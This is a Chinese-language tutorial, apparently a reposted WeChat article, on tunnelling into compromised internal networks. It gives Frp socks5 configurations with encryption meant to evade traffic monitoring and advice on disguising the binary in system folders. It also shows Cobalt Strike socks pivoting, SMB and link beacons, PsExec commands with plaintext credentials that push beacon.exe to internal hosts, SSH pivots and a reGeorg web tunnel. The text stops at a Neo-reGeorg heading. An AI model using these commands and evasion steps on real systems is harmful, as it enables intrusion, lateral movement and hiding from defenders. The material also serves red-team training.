<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/K2Em_X0fLfa1sukzWb2bkQ)

前言
--

在内网渗透时，一个WebShell或CobaltStrike、Metasploit上线等，只是开端，更多是要内网横向移动，扩大战果，打到核心区域。但后渗透的前提是需要搭建一条通向内网的“专属通道”，才能进一步攻击。可实战中因为网络环境不同，所利用的方式就不同。

以下为自我总结“实战中内网穿透的打法”思维导图：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbbTRNKvicoa7ibibsJbic24wCe3txmUNQiappmrofdxhnSNnRvicopov4XfPw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

目标出网（socks代理）
-------------

这是实战中最愿意碰到的网络环境，目标机可以正常访问互联网，可直接在目标机挂socks代理或CobaltStrike上线，打通目标的内网通道。

### Frp（socks5）

Frp服务端配置文件：

<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">[common]</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">2</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">bind_port = 8080</pre></td></tr></tbody></table>

Frp客户端配置文件：

<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">[common]</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">2</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">server_addr = xx.xx.xx.xx</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">3</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">server_port = 8080</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">4</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">#服务端口使用Web常见端口</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">5</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;"></pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">6</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">[socks5]</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">7</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">type = tcp</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">8</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">remote_port = 8088</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">9</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">plugin = socks5</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">10</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">use_encryption = true </pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">11</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">use_compression = true</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">12</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">#socks5口令</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">13</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">#plugin_user = SuperMan</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">14</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="860"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">#plugin_passwd = XpO2McWe6nj3</pre></td></tr></tbody></table>

此处添加了加密压缩这两个功能，默认是不开启的，根据作者介绍，压缩算法使用的是 snappy。

`use_encryption = true` 启用加密 [通信内容加密传输，有效防止流量被拦截]

`use_compression = true` 启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源]

use_encryption = true 、use_compression = true 必须放在相关协议下面。

frp客户端与配置文件传到目标机后，把程序名与配置文件进行修改，并放在系统相关文件夹中，做到隐蔽。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0Wbc3kopF8UiaCuakUvQZ77bPsERvWx4sOiaVMgkoNT9IUdYcbamC5bpzSQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0Wb5Xm6lVxtbFTfJUg0xvPianL2qCLJPOhiae3jerZ4j6n7hwx10Yk6KRXA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)  

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbxFsKv3eEibse11mAZhicuhd3fLdgJBuNeF8nCDJoq0yWADJiasQCeViaww/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 加密压缩的对比

这是frp客户端配置文件中未使用`encryption`与`compression`功能，利用metasploit挂socks代理，扫描ms17_010传输的数据包，明显可辨别出具体攻击行为。如果目标内网有”态势感知“、流量分析等安全设备，就会被监测到，导致权限丢失。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbE6Q1xw2uz7s7BRdcs0eXUn5KKNkDiaO5OLctsRLN3GiaBwpd5V7c3njw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

使用`encryption`与`compression`功能后，虽攻击源地址同样会暴露，但传输的数据包却无法辨别，规避了内网中的安全监测设备。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbicR3hcIvGwLMoiaal1q2cAOyfb2PADJc1Zgzh6SCP9cxNPMyNzYGhIZg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

### CobaltStrike (socks4a)

到已控目标机的Beacon下将socks代理开启。

<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">beacon &gt; socks 1024 #端口根据VPS实际情况进行设置</pre></td></tr></tbody></table>

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WblFsbApmU06SVtvH680WlhuZK4CGs5hiaQLkoPD7BHuLTDky4agOrsUg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

菜单栏中的`View > Proxy Pivots`，复制代理连接到Metasploit中，或直接将socks4a挂在相关安全工具中。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbMSQ8kDhic20lMlZVAlgcMP2uYW3Rqv4x2H9XhPH2DibxALWmsI7HdSfA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 上线不出网机器

这是link链接，只要主链路(出网机Beacon)掉线，均掉！

##### SMB Beacon

官方对SMB Beacon的介绍：SMB Beacon是使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽。

创建一个SMB的Listener (host与port可无视)，注意Listener选择，在session中选择route可达的主机派生会话。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbuaW7ibia9tUmkI0k8Pe82GUorTxH0ZX6o3xl7SCTyygDA3432w6hABXA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

运行成功后，可以看到 ∞∞ 这个字符，这就是派生SMB Beacon的连接状态。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbicLlBHvfPwZql73QOgWDdrznkILJF1BIanQ1rUK3HqvPrkkkQw1z31w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbvtqmRWKarzZTG3x3mFUmVTtWwSa4LEI9awcyZRewQUttibIHiakrA9IQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

可在主Beacon上用link host链接或unlink host断开。

<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">beacon&gt; link 192.168.144.155</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">2</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">beacon&gt; unlink 192.168.144.155</pre></td></tr></tbody></table>

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbDIpQLbGJQTdJQqykAOCcuj8YBXib7J8J5c7yt8PAS5Y5QbJAFbgSTwQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

##### Link Listener

在已上线的主机创建Listener。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbqblPBrt8gUrns4ZzmET1tGgzGiclZsxZ6buDY8SG6FeMqrh2BIVzXQQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

导出该类型Listener对应的可执行文件或dll等。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbticTuDuMciab4ibTKID8wehOibMWHppkdicO8OcNJLGe5KMfW8UcyogGB0A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

选择刚建立的Listener。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbADaOl2ea7dicVfQr9sLDff7b1CTicQA6CNY4PF7UZ1nJCl0Zv55ZPP8w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

上传刚才生成的payload到当前已上线的目标机中，这里用PsExec.exe 工具 。(CobalStrike本身psexec功能不够强大)

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbbeJQtZOLf8AG2Igk354ZakyMqFbx8Z95ewsOLxWia4v8sJRJKcKWXzg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。

<table width="995" style="width: 768px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="988"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">beacon&gt; shell C:\WINDOWS\Temp\PsExec.exe -accepteula \\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\WINDOWS\Temp\beacon.exe</pre></td></tr></tbody></table>

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbPY9y4jbZeI4VZEeKZ7TCXicNArJM4bdrKyPVyjks54yOxTqAj8sCQibQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">beacon&gt; shell netstat -ano |findstr 4444</pre></td></tr></tbody></table>

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbGybmUN5zdUoAPX5QvJ4jib757fVXxubaSJgwnQyz4d9KWr5Ant0erhA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

##### SSH Login

<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">beacon&gt; ssh 192.168.144.174:22 root admin</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">2</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">beacon&gt; ssh 192.168.144.203:22 root admin</pre></td></tr></tbody></table>

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0Wb7sThlzMzWZHrprfc9EaGXR3icqbWjcMMXgvJJEpiafTakHryJmGnv1bQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

在Linux目标机中查看网络连接状态，实际是与之前已上线的Windows主机建立的连接。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbH6cV4NLoffnrHOovYTtjbhQt43hzLcRnet8FrVTI8arZcSH8FMG3jg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

目标不出网（http代理）
-------------

目标机网络中可能有防火墙、网闸等，只允许http单向出，无法正常访问互联网，用上述socks方法是行不通的，只能用http代理进行渗透。

### reGeorg (socks5)

<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">python reGeorgSocksProxy.py -u http://192.168.144.211/tunnel.aspx -l 0.0.0.0 -p 10080</pre></td></tr></tbody></table>

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbiaLUwNdSPWZ77qIicwn1EYDRDoeUaJUkTpbRTBlAXYN5JzCDkuicwkyNw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

利用metasploit挂reGeorg socks代理，扫描ms17_010传输的数据包，明显可辨别攻击行为。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbVuG1sR2NSPHYd9OalhmGF1CBBmoFIuQyWSuCFRzUm1qm5IByfLicKSg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### Neo-reGeorg (加密)

